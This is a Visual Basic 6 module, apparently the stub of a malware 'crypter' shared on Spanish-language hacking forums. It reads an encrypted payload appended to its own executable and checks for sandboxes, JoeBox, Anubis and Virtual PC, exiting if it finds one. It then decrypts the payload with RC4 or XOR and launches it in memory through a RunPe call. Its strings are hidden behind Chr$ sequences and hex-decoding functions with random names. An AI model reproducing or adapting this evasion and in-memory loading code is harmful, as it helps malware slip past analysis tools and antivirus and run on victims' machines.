Attribute VB_Name = "Module1"
'=====================================================================================
'=====================================================================================
'======================== Crypter Creado por [W]HITE~[R]00T ==========================
'================ Para Indetectables.net & Professional-Hacker.org ===================
'================= Greets to: HaX991, DARK_J4V13R, Xa0s, ~V~, dSR ====================
'Aprende del Código, usalo y no hagas RIP's ni el Lammer. Recuerda siempre dar las gra-
'cias y poner Autor y fuente si no lo has hecho tu!, Visita las webs mencionadas. Salu2
'=====================================================================================
'=====================================================================================

'/////////////////////////////////////////////////////////////////////////////////////
'==================> CON TEMOR A DIOS, Y SIN MIEDO AL HOMBRE! <=======================
'/////////////////////////////////////////////////////////////////////////////////////





'/////////////////////////////////////////////////////////////////////////////////////
Sub Main()
Dim MisDatos As String

Open App.Path & Chr$(92)  & App.EXEName & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)  For Binary As #1
    MisDatos = Space(LOF(1))
    Get #1, , MisDatos
Close #1

Dim Antis() As String

Antis() = Split(MisDatos, Chr$(71) & Chr$(114) & Chr$(97) & Chr$(99) & Chr$(105) & Chr$(97) & Chr$(115) & Chr$(68) & Chr$(65) & Chr$(82) & Chr$(75) & Chr$(95) & Chr$(74) & Chr$(52) & Chr$(86) & Chr$(49) & Chr$(51) & Chr$(82) )

If Antis(1) = Chr$(49)  Then

    If Sandboxed() = True Then End
    
End If

If Antis(2) = Chr$(49)  Then

    If iJoeBoxRunning(Environ(Chr$(83) & Chr$(121) & Chr$(115) & Chr$(116) & Chr$(101) & Chr$(109) & Chr$(68) & Chr$(114) & Chr$(105) & Chr$(118) & Chr$(101) ) & Chr$(92) ) = True Then End

End If

If Antis(3) = Chr$(49)  Then

    If iAnubisRunning(Environ(Chr$(83) & Chr$(121) & Chr$(115) & Chr$(116) & Chr$(101) & Chr$(109) & Chr$(68) & Chr$(114) & Chr$(105) & Chr$(118) & Chr$(101) ) & Chr$(92) ) = True Then End

End If

If Antis(4) = Chr$(49)  Then

    If IsVirtualPCPresent = 2 Then End

End If

'Ya, ahora que se hace en el cliente? uff lo mismo que se hace con el crypter

Dim xSplit() As String

xSplit() = Split(MisDatos, Chr$(91) & Chr$(87) & Chr$(93) & Chr$(72) & Chr$(73) & Chr$(84) & Chr$(69) )

'xSplit(0)= Stub
'xSplit(1)= El Archivo encriptado
'xSplit(2)= La encriptacion que se usa
'xSplit(3)= Key

'////////////////////////////////////////////////////////////////////////////

Dim RC4 As New clsRC4, xXor As New clsXOR

If xSplit(2) = Chr$(82) & Chr$(67) & Chr$(52)  Then
    xSplit(1) = RC4.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = Chr$(88) & Chr$(79) & Chr$(82)  Then
    xSplit(1) = xXor.DecryptString(xSplit(1), xSplit(3))
End If

'//////////////////////////////////////////////////////////////////////////////

Dim hDatos() As Byte
    hDatos() = StrConv(xSplit(1), vbFromUnicode)
'//////////////////////////////////////////////////////////////////////////////

Call RunPe(App.Path & Chr$(92)  & App.EXEName & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101) , hDatos(), Command)


End Sub


Public Function d3f9J1eLqz(ByVal gTm4OpPSYm As String) As String
Dim ORh1s8loUj As String
Dim osWPlGGzpN As String
Dim rNVQSjCnJK As Long
For rNVQSjCnJK = 1 to Len(gTm4OpPSYm) Step 2
ORh1s8loUj = Chr$(Val("&H" & Mid$(gTm4OpPSYm,rNVQSjCnJK,2)))
osWPlGGzpN = osWPlGGzpN & ORh1s8loUj
Next rNVQSjCnJK
d3f9J1eLqz = osWPlGGzpN
End Function
